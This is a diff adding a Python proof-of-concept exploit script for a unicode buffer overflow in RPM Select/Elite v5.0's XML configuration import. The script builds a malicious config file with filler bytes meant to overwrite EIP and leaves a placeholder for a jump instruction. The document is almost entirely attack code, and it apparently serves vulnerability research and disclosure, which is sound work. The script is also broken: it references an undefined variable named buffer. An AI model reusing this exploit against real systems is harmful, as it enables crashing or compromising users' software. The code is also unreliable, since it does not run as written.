@@ -1,0 +1,101 @@
+#!/usr/bin/python
+# ####################################################################
+# RPM Select/Elite v5.0 (.xml config parsing) unicode buffer overflow PoC
+# Found by: mr_me - http://net-ninja.net/
+# Homepage: http://lpd.brooksnet.com/
+# Download: http://www.brooksnet.com/download-rpmselect
+# Tested on: Windows XP SP3
+# Advisory: http://www.corelan.be:8800/advisories.php?id=10-024
+# Greetz: Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# ####################################################################
+# Notes: We overwrite EIP @ 32 bytes in, and the function doesnt copy 
+# enough of our string to hit SEH. However modules are compiled with 
+# SAFESEH anyway. Combine that with unicode and the printable ascii 
+# limitations, we are presented with to much of a hurdle.
+# ####################################################################
+# How to trigger the crash:
+# file -> import configuration
+# Click on the queue name, then click on the imported transform
+# Click 'modify transform' and b00m!
+# ####################################################################
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes.
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code.  
+# If you do, Corelan cannot be held responsible for any damages.
+
+header1 = """<RPM version="5.0.70.6">
+  <Queues>
+    <Queue>
+      <description>lol</description>
+      <seqno>0</seqno>
+      <enabled>1</enabled>
+      <actions>1</actions>
+      <held>0</held>
+      <running>0</running>
+      <name>mr_mes print queue</name>
+      <Transforms>
+        <Transform>
+          <LineWrap>0</LineWrap>
+          <lfPitchAndFamily>48</lfPitchAndFamily>
+          <lfOrientation>0</lfOrientation>
+          <lfFaceName>
+"""
+
+header2 = """</lfFaceName>
+		  <lfWidth>0</lfWidth>
+          <UseCharsPerInch>0</UseCharsPerInch>
+          <lfItalic>0</lfItalic>
+          <UseLinesPerPage>0</UseLinesPerPage>
+          <lfEscapement>0</lfEscapement>
+          <LinesPerInch>6.000000</LinesPerInch>
+          <type>24</type>
+          <LeftMargin>0.500000</LeftMargin>
+          <PortraitMax>90</PortraitMax>
+          <CharsPerInch>10.000000</CharsPerInch>
+          <CharsPerLine>80</CharsPerLine>
+          <TopMargin>0.500000</TopMargin>
+          <LinesPerPage>60</LinesPerPage>
+          <lfQuality>2</lfQuality>
+          <lfStrikeOut>0</lfStrikeOut>
+          <lfWeight>400</lfWeight>
+          <FontSize>12</FontSize>
+          <lfUnderline>0</lfUnderline>
+          <BottomMargin>0.500000</BottomMargin>
+          <Orientation>portrait</Orientation>
+          <InputFormat>1252</InputFormat>
+          <CalcLayout>false</CalcLayout>
+          <UseLinesPerInch>1</UseLinesPerInch>
+          <RightMargin>0.500000</RightMargin>
+          <CtrlStrip>1</CtrlStrip>
+          <UseCharsPerLine>0</UseCharsPerLine>
+          <lfCharSet>1</lfCharSet>
+          <lfOutPrecision>0</lfOutPrecision>
+          <lfClipPrecision>0</lfClipPrecision>
+          <SuppressBlankPage>1</SuppressBlankPage>
+          <lfHeight>-16</lfHeight>
+        </Transform>
+      </Transforms>
+      <Jobs />
+    </Queue>
+  </Queues>
+  <Hosts />
+</RPM>
+"""
+
+payload = "\x41" * 32
+payload += "\x42\x42" # your "jmp to esp" instruction should go here
+payload += "\x44" * (5000-len(buffer))
+exploit = header1.rstrip() + payload.rstrip() + header2.rstrip()
+try:
+	f=open("cst-rpm-config.xml",'w')
+	f.write(exploit)
+	f.close()
+	print "[+] File created successfully !"
+except:
+	print "[-] Error cannot write xml file to system\n"
